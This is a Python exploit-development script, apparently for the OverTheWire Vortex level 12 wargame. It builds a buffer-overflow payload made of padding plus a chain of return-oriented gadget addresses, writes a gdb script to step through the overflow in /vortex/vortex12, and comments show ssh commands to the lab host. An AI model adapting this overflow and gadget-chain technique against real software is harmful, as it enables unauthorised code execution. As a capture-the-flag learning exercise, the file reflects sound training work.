import os
import time
from subprocess import Popen, PIPE


# writes payload to payload file /tmp/docgil and gdb.script to /tmp/gdb.script
# this script is supposed to be copied and pasted to remote ssh session and executed there

# rm -rf /tmp/script; vim -c startinsert /tmp/script; python3 /tmp/script;
# rm -rf /tmp/script; vim -c startinsert /tmp/script; python3 /tmp/script; gdb -x /tmp/gdb.script /vortex/vortex12

payload_file_path = "/tmp/docgil"
gdb_script_file_path = "/tmp/gdb.script"
hex_to_byte_script_path = "/tmp/hex_to_byte"

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx\xd9\xff\xff(\xb6\xe2\xf7\xe4\xd9\xff\xff3\xac\xe5\xf7XXXX\x7fJ\xe3\xf7(\xb6\xe2\xf7\xe4\xd9\xff\xff3\xac\xe5\xf7XXXX\x7fJ\xe3\xf7(\xb6\xe2\xf7\xe4\xd9\xff\xff3\xac\xe5\xf7XXXX\x7fJ\xe3\xf7(\xb6\xe2\xf7\xe4\xd9\xff\xff3\xac\xe5\xf7XXXX\x7fJ\xe3\xf7(\xb6\xe2\xf7XS\xe0\xf73\xac\xe5\xf7<\xa9\xe0\xf7\x7fJ\xe3\xf7(\xb6\xe2\xf7\\S\xe0\xf73\xac\xe5\xf7\xfc\xd9\xff\xff\x7fJ\xe3\xf7(\xb6\xe2\xf7\x10\xa0\x04\x083\xac\xe5\xf7\xb9\x87\x04\x08\x7fJ\xe3\xf7\xe0\x84\x04\x08RRRR\x11\x11\x11\x11XXXXXXXXXXXXXXXX\xb9\x87\x04\x08<\xa9\xe0\xf7\xb0>\xfc\xf7RRRR\xcco\xf6\xf7'

gdb_script = '''
set disassembly-flavor intel   
# https://stackoverflow.com/questions/5697042/command-to-suspend-a-thread-with-gdb

alias gil = disassemble
alias gili = x/2i
alias gilr = 'x/2wx $ebp'

set target-async 1
set non-stop on


unset env
show env


# before strcpy in parent
b* 0x080486b1

# at safecode
b *0x0804865d

# before call fflush in child
#b *0x08048685     

# pop eax gadget
#b *0xf7e2b628
# mov gadget
#b* 0xf7e34a7f

def gilparent
b *sleep
shell sleep 0.5
thread apply 1 continue
shell sleep 0.5
thread 2
shell sleep 0.5
gil safecode
shell sleep 0.5
x/20wx $esp
end


# buf adr: 0xffffd540
def overflow
shell echo "before overflow"
x/2wx $ebp  
shell sleep 0.5
si
shell sleep 0.5
finish
shell sleep 0.5
shell echo "after overflow"
x/2wx $ebp 
shell sleep 0.5
si
shell sleep 0.5
si
shell sleep 0.5
shell echo "buffer:"
x/400wx 0xffffd540
end



def gilwrite

thread apply 1 continue
shell sleep 0.5

thread apply 1 continue
shell echo "adr:"
i r eax
shell echo "val:"
i r ecx

shell sleep 0.5
thread apply 1 si
shell sleep 0.5
thread apply 1 si
end


def update_got
thread apply 1 si
end


                                                                        
r `cat /tmp/docgil`
# this will cause to halt both threads at their breakpoints


# # this last line is essential, always include it
shell echo done
'''

# find out childs fflush arg adr
# gdb_script = '''
# set follow-fork-mode child
# set disassembly-flavor intel
#
#
#
# unset env
# show env
#
#
# # before call fflush in child
# b *0x08048685
#
# r `cat /tmp/docgil`
#
# x/2wx $ebp
#
# # this last line is essential, always include it
# shell echo done
# '''

fd = open(gdb_script_file_path, "w")
fd.write(gdb_script)
fd.close()

hex_to_byte_script = '''
import sys
import time
# srcipt.py target-file hexstring


def write_to_file(data):
    f = open(filename, 'wb')
    f.write(data)
    f.close()

filename = sys.argv[1]
hexadecimal_string = sys.argv[2]
parsed_hexadecimal_string = ""

first_part_without_x = None
try:
    first_x_index = hexadecimal_string.index("\\\\x")
    if first_x_index == 0:
        # do nothing, starts with \\\\x wont cause problems
        time.sleep(0.1)
    else:
        first_part = hexadecimal_string[:first_x_index]
        first_part_without_x = first_part

except ValueError:
    write_to_file(bytes(hexadecimal_string, "utf-8"))
    print("done")
    exit(0)

parts = hexadecimal_string.split("\\\\x")

parts_index = 0
skip = False

for part in parts:
    parts_index += 1
    if part == "":
        continue
    if parts_index == 1 and first_part_without_x:
        for c in first_part_without_x:
            hex_c = hex(ord(c)).replace("0x", "")
            parsed_hexadecimal_string += hex_c
        continue
    parsed_hexadecimal_string += part[:2]
    for i in range(len(part)-2):
        if skip:
            skip = False
            continue
        unparsed = part[i+2]
        # newline does not work, maybe convert to bytes in this special case
        # and get hex from that, and reconvert to hex string with hex function
        if unparsed == '\\\\':
            skip = True
            unparsed += part[i + 3]
            unparsed = unparsed[1:]
            if unparsed == 'a':
                unparsed = "\\a"
            if unparsed == 'b':
                unparsed = "\\b"
            if unparsed == 't':
                unparsed = "\\t"
            if unparsed == 'n':
                unparsed = "\\n"
            if unparsed == 'v':
                unparsed = "\\v"
            if unparsed == 'f':
                unparsed = "\\f"
            if unparsed == 'r':
                unparsed = "\\r"
            i+=2
        unparsed = hex(ord(unparsed)).replace("0x", "")
        if len(unparsed) == 1:
            unparsed = "0"+unparsed
        parsed_hexadecimal_string += unparsed

data = bytearray.fromhex(parsed_hexadecimal_string)
write_to_file(data)
print("done")
'''

def remove_at(i, s):
    return s[:i] + s[i+1:]

str_payload = str(payload)

print(str_payload)

str_payload = remove_at(0, str_payload)
str_payload = remove_at(0, str_payload)
str_payload = remove_at(len(str_payload)-1, str_payload)

print(str_payload)

fd = open(hex_to_byte_script_path, "w")
fd.write(hex_to_byte_script)
fd.close()
time.sleep(1)
p = Popen(['python3', hex_to_byte_script_path, payload_file_path, str_payload], stdin=PIPE)
out, err = p.communicate()

print("out:")
print(out)
print("err:")
print(err)

# os.system("python3 /tmp/hex_to_byte " + payload_file + " " + str_payload)


# ssh -p 2228 vortex12@vortex.labs.overthewire.org "cat > /tmp/gdb.script; bash -i " < gdb.script
# ssh -p 2228 vortex12@vortex.labs.overthewire.org "echo gil; bash -i"
# cat gdb.script | ssh -p 2228 vortex12@vortex.labs.overthewire.org "cat > /tmp/gdb.script; bash -i"





































































